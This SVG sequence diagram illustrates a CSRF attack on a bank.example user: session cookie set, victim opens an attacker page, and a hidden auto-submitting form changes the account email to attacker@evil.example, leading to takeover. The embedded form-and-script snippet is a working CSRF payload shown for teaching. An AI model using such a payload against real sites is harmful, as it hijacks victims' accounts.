<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1040 640" width="1040" height="640" font-family="'Space Grotesk','Segoe UI',system-ui,sans-serif">
  <defs>
    <pattern id="grid" width="24" height="24" patternUnits="userSpaceOnUse">
      <path d="M24 0H0V24" fill="none" stroke="#21262d" stroke-width="1" opacity="0.5"/>
    </pattern>
    <marker id="ar" markerWidth="9" markerHeight="9" refX="7" refY="3" orient="auto" markerUnits="strokeWidth">
      <path d="M0,0 L7,3 L0,6 Z" fill="#8b949e"/>
    </marker>
    <marker id="arRed" markerWidth="9" markerHeight="9" refX="7" refY="3" orient="auto" markerUnits="strokeWidth">
      <path d="M0,0 L7,3 L0,6 Z" fill="#f85149"/>
    </marker>
  </defs>

  <!-- canvas -->
  <rect x="0" y="0" width="1040" height="640" fill="#0d1117"/>
  <rect x="0" y="0" width="1040" height="640" fill="url(#grid)"/>

  <!-- title -->
  <text x="22" y="34" font-size="13" font-family="'JetBrains Mono',monospace" fill="#00caff" letter-spacing="1">&gt;_</text>
  <text x="50" y="36" font-size="19" font-weight="700" fill="#e6edf3">Cross-Site Request Forgery (CSRF) - Attack Path</text>

  <!-- legend -->
  <line x1="858" y1="20" x2="884" y2="20" stroke="#8b949e" stroke-width="1.5" marker-end="url(#ar)"/>
  <text x="890" y="24" font-size="11" fill="#8b949e">request</text>
  <line x1="858" y1="38" x2="884" y2="38" stroke="#8b949e" stroke-width="1.5" stroke-dasharray="5 3" marker-end="url(#ar)"/>
  <text x="890" y="42" font-size="11" fill="#8b949e">response</text>
  <line x1="858" y1="56" x2="884" y2="56" stroke="#f85149" stroke-width="1.5" marker-end="url(#arRed)"/>
  <text x="890" y="60" font-size="11" fill="#ff6b6b">forged request</text>

  <!-- lifelines -->
  <line x1="150" y1="110" x2="150" y2="585" stroke="#30363d" stroke-width="1.5" stroke-dasharray="4 5"/>
  <line x1="480" y1="110" x2="480" y2="585" stroke="#30363d" stroke-width="1.5" stroke-dasharray="4 5"/>
  <line x1="800" y1="110" x2="800" y2="585" stroke="#30363d" stroke-width="1.5" stroke-dasharray="4 5"/>

  <!-- actor headers -->
  <rect x="75" y="64" width="150" height="46" rx="6" fill="#161b22" stroke="#00caff" stroke-width="1.5"/>
  <text x="150" y="87" text-anchor="middle" font-size="14" font-weight="700" fill="#5cd6f7">Attacker</text>
  <text x="150" y="101" text-anchor="middle" font-size="9" font-family="'JetBrains Mono',monospace" fill="#8b949e">attacker.example</text>

  <rect x="405" y="64" width="150" height="46" rx="6" fill="#161b22" stroke="#30363d" stroke-width="1.5"/>
  <text x="480" y="87" text-anchor="middle" font-size="14" font-weight="700" fill="#e6edf3">Victim</text>
  <text x="480" y="101" text-anchor="middle" font-size="9" font-family="'JetBrains Mono',monospace" fill="#8b949e">logged-in user</text>

  <rect x="725" y="64" width="150" height="46" rx="6" fill="#161b22" stroke="#30363d" stroke-width="1.5"/>
  <text x="800" y="87" text-anchor="middle" font-size="14" font-weight="700" fill="#e6edf3">Bank</text>
  <text x="800" y="101" text-anchor="middle" font-size="9" font-family="'JetBrains Mono',monospace" fill="#8b949e">bank.example</text>

  <!-- 1. login (Victim -> Bank) -->
  <text x="645" y="154" text-anchor="middle" font-size="11" fill="#e6edf3">1. POST /login  (credentials)</text>
  <line x1="488" y1="160" x2="792" y2="160" stroke="#8b949e" stroke-width="1.5" marker-end="url(#ar)"/>
  <text x="812" y="163" font-size="9" font-family="'JetBrains Mono',monospace" fill="#8b949e">session created</text>

  <!-- 2. set-cookie (Bank -> Victim) -->
  <text x="645" y="200" text-anchor="middle" font-size="11" fill="#e6edf3">2. 200 OK  ·  Set-Cookie: session=…  (SameSite=None)</text>
  <line x1="792" y1="206" x2="488" y2="206" stroke="#8b949e" stroke-width="1.5" stroke-dasharray="5 3" marker-end="url(#ar)"/>
  <text x="480" y="230" text-anchor="middle" font-size="9.5" font-style="italic" fill="#6e7681">victim is now logged in to bank.example</text>

  <!-- 3. victim visits attacker page (Victim -> Attacker) -->
  <text x="315" y="270" text-anchor="middle" font-size="11" fill="#e6edf3">3. GET /  (victim opens the attacker page)</text>
  <line x1="470" y1="276" x2="158" y2="276" stroke="#8b949e" stroke-width="1.5" marker-end="url(#ar)"/>

  <!-- 4. attacker serves malicious page (Attacker -> Victim) -->
  <text x="315" y="312" text-anchor="middle" font-size="11" fill="#e6edf3">4. 200 OK  ·  malicious auto-submit page</text>
  <line x1="158" y1="318" x2="470" y2="318" stroke="#8b949e" stroke-width="1.5" stroke-dasharray="5 3" marker-end="url(#ar)"/>

  <!-- malicious form (note near the attacker lifeline) -->
  <rect x="28" y="334" width="284" height="120" rx="6" fill="#1c2128" stroke="#30363d" stroke-width="1"/>
  <text x="40" y="350" font-size="9" fill="#8b949e">the attacker's page (auto-submits):</text>
  <g font-size="9" font-family="'JetBrains Mono',monospace" fill="#a0e9ff">
    <text x="40" y="365">&lt;form action="https://bank.example</text>
    <text x="40" y="378">      /account/email" method="POST"&gt;</text>
    <text x="40" y="391">  &lt;input type="hidden" name="email"</text>
    <text x="40" y="404">         value="attacker@evil.example"&gt;</text>
    <text x="40" y="417">&lt;/form&gt;</text>
    <text x="40" y="430">&lt;script&gt;document.forms[0].submit()</text>
    <text x="40" y="443">&lt;/script&gt;</text>
  </g>

  <!-- 5. forged request (Victim -> Bank) - the vulnerable step -->
  <text x="645" y="486" text-anchor="middle" font-size="11.5" font-weight="600" fill="#e6edf3">5. POST /account/email  (forged, auto-submitted)</text>
  <text x="645" y="499" text-anchor="middle" font-size="10" font-family="'JetBrains Mono',monospace" fill="#ff6b6b">Cookie: session=…  ·  NO anti-CSRF token</text>
  <line x1="488" y1="506" x2="792" y2="506" stroke="#f85149" stroke-width="2" marker-end="url(#arRed)"/>
  <text x="812" y="498" font-size="9" font-family="'JetBrains Mono',monospace" fill="#ff6b6b">valid session,</text>
  <text x="812" y="510" font-size="9" font-family="'JetBrains Mono',monospace" fill="#ff6b6b">no token check:</text>
  <text x="812" y="522" font-size="9" font-family="'JetBrains Mono',monospace" fill="#ff6b6b">email changed</text>

  <!-- 6. response (Bank -> Victim) -->
  <text x="645" y="548" text-anchor="middle" font-size="11" fill="#e6edf3">6. 200 OK</text>
  <line x1="792" y1="554" x2="488" y2="554" stroke="#8b949e" stroke-width="1.5" stroke-dasharray="5 3" marker-end="url(#ar)"/>

  <!-- impact caption -->
  <text x="22" y="606" font-size="12.5" fill="#6e7681">The victim's browser auto-attaches the bank session cookie to the attacker's cross-site request.</text>
  <text x="22" y="624" font-size="12.5" fill="#6e7681">With no anti-CSRF token to check, the bank performs the change as the victim, the path to <tspan fill="#4ade80" font-weight="700">account takeover</tspan>.</text>
</svg>
